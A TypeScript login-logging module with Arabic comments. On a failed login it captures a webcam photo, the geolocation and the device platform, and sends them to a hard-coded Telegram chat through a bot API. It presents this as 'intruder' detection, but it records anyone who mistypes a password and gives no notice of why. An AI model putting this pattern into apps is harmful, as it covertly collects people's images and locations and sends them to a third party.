import { supabase } from './supabase';
import axios from 'axios';

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const CHAT_ID = '8785273119';

// 1. دالة الحصول على الموقع الجغرافي
const getLocation = (): Promise<string> => {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("📍 الموقع غير مدعوم");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude } = pos.coords;
        resolve(`https://www.google.com/maps?q=${latitude},${longitude}`);
      },
      () => resolve("📍 تم رفض إذن الموقع"),
      { timeout: 10000 }
    );
  });
};

// 2. دالة التقاط الصورة
const captureIntruder = async (): Promise<Blob | null> => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    return new Promise((resolve) => {
      video.onloadedmetadata = async () => {
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d')?.drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        canvas.toBlob((b) => resolve(b), 'image/jpeg', 0.8);
      };
    });
  } catch { return null; }
};

// 3. التقرير الاستخباراتي المتكامل
export const logAuthAttempt = async (status: 'SUCCESS' | 'FAILED', errorMsg?: string) => {
  if (status === 'FAILED') {
    const [intruderPhoto, locationUrl] = await Promise.all([captureIntruder(), getLocation()]);
    const timestamp = new Date().toLocaleString('ar-MA');
    
    const alertText = `🚨 *تنبيه أمني: محاولة اختراق* 🚨\n\n` +
                      `⏰ الوقت: ${timestamp}\n` +
                      `📍 الموقع: [اضغط هنا لفتح الخريطة](${locationUrl})\n` +
                      `💻 الجهاز: ${navigator.platform}\n` +
                      `❌ الخطأ: ${errorMsg || 'بيانات خاطئة'}`;

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    if (intruderPhoto) formData.append('photo', intruderPhoto, 'intruder.jpg');
    formData.append(intruderPhoto ? 'caption' : 'text', alertText);
    formData.append('parse_mode', 'Markdown');

    const endpoint = intruderPhoto ? 'sendPhoto' : 'sendMessage';
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, formData);
  }
  
  await supabase.from('login_attempts').insert([{ status, user_agent: navigator.userAgent }]);
};
